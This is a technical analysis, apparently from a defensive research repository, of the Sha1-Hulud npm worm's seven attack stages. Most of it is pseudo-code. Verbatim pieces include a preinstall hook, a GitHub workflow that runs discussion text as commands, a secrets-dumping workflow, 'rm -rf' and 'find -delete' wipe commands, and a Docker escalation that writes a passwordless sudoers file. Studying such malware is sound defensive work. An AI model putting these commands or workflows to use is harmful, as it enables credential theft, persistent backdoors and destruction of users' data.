# Technical Details & Attack Flow

This document provides a technical deep dive into the Shai1-Hulud malware's implementation and attack flow.

**⚠️ Educational Purpose Only**: This information is for defensive security research and understanding the attack mechanics. Do not use this information for malicious purposes.

---

## Attack Flow Overview

```
┌─────────────────────────────────────────────────────────────┐
│ Stage 1: Initial Execution                                  │
│ Platform detection, CI/CD vs desktop environment check      │
└────────────┬────────────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────────────┐
│ Stage 2: GitHub Authentication                              │
│ Token discovery, novel "token recycling" technique          │
└────────────┬────────────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────────────┐
│ Stage 3: Repository Setup & Persistence                     │
│ Create exfiltration repos, install self-hosted runners      │
└────────────┬────────────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────────────┐
│ Stage 4: Credential Harvesting                              │
│ AWS, GCP, Azure, GitHub, npm tokens, TruffleHog scanning    │
└────────────┬────────────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────────────┐
│ Stage 5: Data Exfiltration                                  │
│ Double base64-encoded uploads to public GitHub repos        │
└────────────┬────────────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────────────┐
│ Stage 6: Self-Propagation                                   │
│ Worm behavior, infects up to 100 packages per token         │
└────────────┬────────────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────────────┐
│ Stage 7: Destructive Failsafe                               │
│ Home directory deletion if exfiltration fails               │
└─────────────────────────────────────────────────────────────┘
```

---

## Stage 1: Initial Execution

### Entry Point

The malware executes during npm package installation via lifecycle scripts:

```json
// package.json
{
  "scripts": {
    "preinstall": "node setup_bun.js"
  }
}
```

### Platform Detection

```javascript
// Pseudo-code
FUNCTION main():
    // Skip Windows machines
    IF is_windows():
        RETURN

    // Determine execution mode
    IF running_in_ci_cd():
        execute_immediately()
    ELSE:
        spawn_background_process()
```

### Environment Detection

```javascript
FUNCTION running_in_ci_cd():
    ci_indicators = [
        "CI",
        "CONTINUOUS_INTEGRATION",
        "JENKINS_HOME",
        "GITHUB_ACTIONS",
        "GITLAB_CI",
        "CIRCLECI"
    ]

    FOR EACH indicator IN ci_indicators:
        IF env_exists(indicator):
            RETURN TRUE

    RETURN FALSE
```

**Defense**: This is why `ignore-scripts=true` is critical in CI/CD environments.

---

## Stage 2: GitHub Authentication

### Token Discovery

The malware searches multiple locations for GitHub tokens:

```javascript
FUNCTION find_github_token():
    // 1. Environment variables
    FOR EACH env_var IN environment_variables:
        IF env_var.name MATCHES "GITHUB_TOKEN":
            RETURN env_var.value
        IF env_var.value MATCHES pattern("ghp_", "gho_", "ghr_", "ghs_"):
            RETURN env_var.value

    // 2. .netrc file
    IF file_exists("~/.netrc"):
        content = read_file("~/.netrc")
        token = extract_github_token(content)
        IF token:
            RETURN token

    // 3. git config
    IF file_exists("~/.gitconfig"):
        content = read_file("~/.gitconfig")
        token = extract_token(content)
        IF token:
            RETURN token

    RETURN NULL
```

### Novel Token Recycling Technique

**This is one of the most innovative aspects of the attack:**

```javascript
FUNCTION token_recycling():
    // Search for other compromised repositories
    search_results = github_api_search(
        'description:"Sha1-Hulud: The Second Coming"'
    )

    FOR EACH victim_repo IN search_results:
        TRY:
            // Download stolen credentials from other victims
            contents = download_file(victim_repo, "contents.json")

            // Double base64 decode
            decoded_once = base64_decode(contents)
            decoded_twice = base64_decode(decoded_once)

            stolen_data = parse_json(decoded_twice)

            // Extract and reuse tokens
            FOR EACH token IN stolen_data.github_tokens:
                IF validate_token(token):
                    RETURN token  // Reuse another victim's token!
        CATCH:
            CONTINUE

    RETURN NULL
```

**Impact**: This technique allows the malware to persist even after the initial compromise is cleaned up. It creates a decentralized credential pool.

---

## Stage 3: Repository Setup & Persistence

### Exfiltration Repository Creation

```javascript
FUNCTION create_exfiltration_repo(github_token):
    // Generate random 18-character UUID
    repo_name = generate_uuid(18)

    // Create public repository with telltale description
    github_api_create_repo(
        token: github_token,
        name: repo_name,
        description: "Sha1-Hulud: The Second Coming",
        public: TRUE
    )

    RETURN repo_name
```

### Persistent Backdoor Installation

**This creates long-term access via GitHub Actions self-hosted runner:**

```javascript
FUNCTION install_persistent_backdoor(github_token):
    // Check workflow permissions
    IF NOT has_permission(github_token, "workflow"):
        RETURN

    // Download GitHub Actions runner
    runner_url = "https://github.com/actions/runner/releases/download/v2.x.x/actions-runner-linux-x64.tar.gz"
    download_file(runner_url, "/tmp/runner.tar.gz")
    extract_archive("/tmp/runner.tar.gz", "~/.dev-env/")

    // Get registration token
    registration_token = github_api_get_runner_token(github_token)

    // Configure with malicious name
    execute_command(
        "~/.dev-env/config.sh " +
        "--url https://github.com/VICTIM_ACCOUNT " +
        "--token " + registration_token +
        "--name SHA1HULUD " +
        "--labels self-hosted"
    )

    // Start runner in background (survives reboots)
    execute_command("nohup ~/.dev-env/run.sh &")

    // Create malicious workflow
    create_discussion_workflow()
```

### Malicious Workflow

```yaml
# .github/workflows/discussion.yaml
name: Discussion Handler
on:
  discussion:
    types: [created]
jobs:
  execute:
    runs-on: [self-hosted, SHA1HULUD]
    steps:
      - name: Execute
        run: |
          # Injectable command execution point
          ${{ github.event.discussion.body }}
```

**Attack vector**: Attackers can execute arbitrary commands by creating a GitHub Discussion with commands in the body.

---

## Stage 4: Credential Harvesting

### Comprehensive Credential Collection

```javascript
FUNCTION harvest_all_credentials():
    credentials = {}

    credentials.env = scan_environment_variables()
    credentials.aws = harvest_aws_credentials()
    credentials.gcp = harvest_gcp_credentials()
    credentials.azure = harvest_azure_credentials()
    credentials.github = harvest_github_secrets()
    credentials.npm = harvest_npm_tokens()
    credentials.truffleHog = run_trufflehog_scan()

    RETURN credentials
```

### AWS Credential Harvesting

```javascript
FUNCTION harvest_aws_credentials():
    aws_creds = {}

    // Environment variables
    IF env_exists("AWS_ACCESS_KEY_ID"):
        aws_creds.access_key = get_env("AWS_ACCESS_KEY_ID")
        aws_creds.secret_key = get_env("AWS_SECRET_ACCESS_KEY")
        aws_creds.session_token = get_env("AWS_SESSION_TOKEN")

    // AWS config files
    IF file_exists("~/.aws/credentials"):
        aws_creds.files = parse_aws_credentials_file("~/.aws/credentials")

    // Enumerate providers
    providers = ["Environment", "SharedCredentials", "ECS", "EC2Instance"]
    FOR EACH provider IN providers:
        TRY:
            creds = get_aws_credentials_from_provider(provider)
            aws_creds[provider] = creds
        CATCH:
            CONTINUE

    // Scan Secrets Manager across 17 AWS regions
    regions = [
        "us-east-1", "us-east-2", "us-west-1", "us-west-2",
        "eu-west-1", "eu-central-1", "ap-southeast-1", ...
    ]

    FOR EACH region IN regions:
        TRY:
            secrets = aws_secretsmanager_list_secrets(region)
            aws_creds["secrets_" + region] = secrets
        CATCH:
            CONTINUE

    RETURN aws_creds
```

### GCP Credential Harvesting

```javascript
FUNCTION harvest_gcp_credentials():
    gcp_creds = {}

    // Application Default Credentials
    IF file_exists("~/.config/gcloud/application_default_credentials.json"):
        gcp_creds.adc = read_file("~/.config/gcloud/application_default_credentials.json")

    // Service account keys
    IF file_exists("~/.config/gcloud/legacy_credentials"):
        gcp_creds.legacy = read_directory("~/.config/gcloud/legacy_credentials")

    // Environment variables
    IF env_exists("GOOGLE_APPLICATION_CREDENTIALS"):
        gcp_creds.app_creds = read_file(get_env("GOOGLE_APPLICATION_CREDENTIALS"))

    // Scan GCP Secret Manager
    TRY:
        gcp_client = authenticate_gcp()
        secrets = gcp_client.list_secrets()
        gcp_creds.secret_manager = secrets
    CATCH:
        PASS

    RETURN gcp_creds
```

### Azure Credential Harvesting

```javascript
FUNCTION harvest_azure_credentials():
    azure_creds = {}

    // Try all Azure credential methods
    credential_sources = [
        "EnvironmentCredential",
        "ManagedIdentityCredential",
        "AzureCliCredential",
        "AzurePowerShellCredential"
    ]

    FOR EACH source IN credential_sources:
        TRY:
            creds = get_azure_credentials(source)
            azure_creds[source] = creds
        CATCH:
            CONTINUE

    // Scan Azure Key Vault
    TRY:
        key_vaults = list_azure_key_vaults()
        FOR EACH vault IN key_vaults:
            secrets = vault.list_secrets()
            azure_creds["keyvault_" + vault.name] = secrets
    CATCH:
        PASS

    RETURN azure_creds
```

### npm Token Harvesting

```javascript
FUNCTION harvest_npm_tokens():
    npm_tokens = []

    // Check .npmrc files
    npmrc_locations = [
        "~/.npmrc",
        "./.npmrc",
        "/etc/npmrc"
    ]

    FOR EACH location IN npmrc_locations:
        IF file_exists(location):
            content = read_file(location)
            tokens = extract_npm_tokens(content)
            npm_tokens.extend(tokens)

    // Check environment variable
    IF env_exists("NPM_TOKEN"):
        npm_tokens.append(get_env("NPM_TOKEN"))

    // Validate each token
    valid_tokens = []
    FOR EACH token IN npm_tokens:
        IF validate_npm_token(token):
            valid_tokens.append(token)

    RETURN valid_tokens
```

### TruffleHog Deep Scanning

```javascript
FUNCTION run_trufflehog_scan():
    // Download TruffleHog binary
    download_file(
        "https://github.com/trufflesecurity/trufflehog/releases/latest/download/trufflehog_linux_amd64.tar.gz",
        "/tmp/trufflehog.tar.gz"
    )
    extract_archive("/tmp/trufflehog.tar.gz", "/tmp/")

    // Scan home directory for secrets
    output = execute_command("/tmp/trufflehog filesystem ~/ --json")
    secrets = parse_json(output)

    RETURN secrets
```

---

## Stage 5: Data Exfiltration

### Double Base64 Encoding

**Why double encoding?** Makes automated detection harder and bypasses some simple string matching.

```javascript
FUNCTION double_base64_encode(data):
    json_string = json_stringify(data)
    encoded_once = base64_encode(json_string)
    encoded_twice = base64_encode(encoded_once)
    RETURN encoded_twice
```

### Exfiltration Process

```javascript
FUNCTION exfiltrate_data(credentials, github_token):
    exfil_repo = get_or_create_exfil_repo(github_token)

    // Create separate files for different credential types
    files = {
        "environment.json": double_base64_encode(credentials.env),
        "cloud.json": double_base64_encode({
            "aws": credentials.aws,
            "gcp": credentials.gcp,
            "azure": credentials.azure
        }),
        "contents.json": double_base64_encode({
            "github": credentials.github,
            "npm": credentials.npm
        }),
        "truffleSecrets.json": double_base64_encode(credentials.truffleHog)
    }

    // Upload to public GitHub repository
    FOR EACH filename, content IN files:
        github_api_create_or_update_file(
            repo: exfil_repo,
            path: filename,
            content: content,
            message: "Update " + filename,
            token: github_token
        )

    // Create continuous exfiltration workflow
    create_exfiltration_workflow(exfil_repo, github_token)
```

### Continuous Exfiltration Workflow

```javascript
FUNCTION create_exfiltration_workflow(repo, github_token):
    workflow = """
name: Code Formatter
on:
  push:
  schedule:
    - cron: '0 */6 * * *'  # Every 6 hours
jobs:
  exfiltrate:
    runs-on: ubuntu-latest
    steps:
      - name: Extract Secrets
        run: |
          echo "${{ toJSON(secrets) }}" | base64 | base64 > secrets.json
      - name: Upload
        uses: actions/upload-artifact@v3
        with:
          name: secrets
          path: secrets.json
"""

    github_api_create_file(
        repo: repo,
        path: ".github/workflows/formatter.yml",
        content: workflow,
        token: github_token
    )
```

---

## Stage 6: Self-Propagation (Worm Behavior)

### Package Infection Logic

```javascript
FUNCTION propagate_to_other_packages(credentials):
    npm_tokens = credentials.npm

    IF npm_tokens.length == 0:
        RETURN

    FOR EACH npm_token IN npm_tokens:
        // Get all packages this maintainer controls
        packages = npm_api_get_maintainer_packages(npm_token)

        // Limit to 100 packages (v2.0 upgrade from 20 in v1.0)
        packages = packages[0:100]

        FOR EACH package IN packages:
            TRY:
                infect_package(package, npm_token)
            CATCH error:
                CONTINUE  // Fail silently
```

### Package Infection Process

```javascript
FUNCTION infect_package(package_name, npm_token):
    // Download legitimate version
    latest_version = npm_api_get_latest_version(package_name)
    package_tarball = npm_download_package(package_name, latest_version)
    extract_archive(package_tarball, "/tmp/package")

    // Read package.json
    package_json = read_json("/tmp/package/package.json")

    // Inject malicious preinstall script
    package_json["scripts"]["preinstall"] = "node setup_bun.js"

    // Add malicious files
    copy_file(THIS_MALWARE, "/tmp/package/setup_bun.js")
    copy_file(PAYLOAD, "/tmp/package/bun_environment.js")

    // Bump version number
    new_version = increment_patch_version(latest_version)
    package_json["version"] = new_version
    write_json("/tmp/package/package.json", package_json)

    // Create and publish infected tarball
    create_tarball("/tmp/package", "/tmp/infected.tgz")
    npm_api_publish(
        package: "/tmp/infected.tgz",
        token: npm_token
    )
```

**Impact**: This creates exponential spread. One compromised maintainer can lead to 100 infected packages, each potentially reaching thousands of users.

---

## Stage 7: Destructive Failsafe

### Trigger Conditions

```javascript
FUNCTION scorched_earth():
    // Only execute if ALL exfiltration methods failed
    conditions = [
        NOT authenticated_to_github(),
        NOT created_github_repo(),
        NOT found_github_token(),
        NOT found_npm_token()
    ]

    IF ALL(conditions):
        log("Exfiltration failed. Activating scorched earth protocol.")
        destroy_home_directory()
```

### Destruction Methods

```javascript
FUNCTION destroy_home_directory():
    home = get_home_directory()

    // Attempt 1: Direct deletion
    execute_command("rm -rf " + home + "/*")

    // Attempt 2: Delete all writable files
    current_user = get_current_user()
    execute_command(
        "find " + home + " -user " + current_user + " -writable -delete"
    )

    // Attempt 3: Privilege escalation via Docker
    IF command_exists("docker"):
        escalate_and_destroy()
```

### Privilege Escalation via Docker

```javascript
FUNCTION escalate_and_destroy():
    // Use Docker to gain root access
    malicious_sudoers = """
Defaults !authenticate
""" + get_current_user() + " ALL=(ALL) NOPASSWD:ALL"

    // Mount host filesystem and modify sudoers
    execute_command("""
        docker run --rm -v /:/host alpine sh -c '
            echo '""" + malicious_sudoers + """' > /host/etc/sudoers.d/malicious
            chmod 440 /host/etc/sudoers.d/malicious
        '
    """)

    // Now have passwordless sudo - wipe everything
    execute_command("sudo rm -rf " + get_home_directory() + "/*")
    execute_command("sudo find " + get_home_directory() + " -type f -delete")
```

**Defense**: This is why Docker socket access should be restricted and monitored.

---

## Key Technical Innovations

### 1. Token Recycling
- Creates decentralized credential pool
- Allows persistence even after cleanup
- Novel technique not seen in previous supply chain attacks

### 2. Self-Hosted Runner Backdoor
- Survives credential rotation
- Provides persistent remote access
- Difficult to detect without specific checks

### 3. Double Base64 Encoding
- Bypasses simple string matching
- Makes automated detection harder
- Still easily decodable for attackers

### 4. Privilege Escalation via Docker
- Exploits common Docker configurations
- Gains root access from unprivileged user
- Enables complete system compromise

### 5. Conditional Destruction
- Only destroys if exfiltration fails
- Reduces detection by avoiding unnecessary damage
- Maximizes credential theft success rate

---

## Complete Attack Flow Pseudo-Code

For the full pseudo-code implementation of all 7 stages, see the original `pseudo-code.txt` file in the repository root.

---

**See also:**
- [Attack Overview](attack-overview.md) - High-level understanding
- [Detection Indicators](detection.md) - How to detect this attack
- [Response Guide](response.md) - What to do if compromised
- [Protection Strategies](protection.md) - How to defend against this
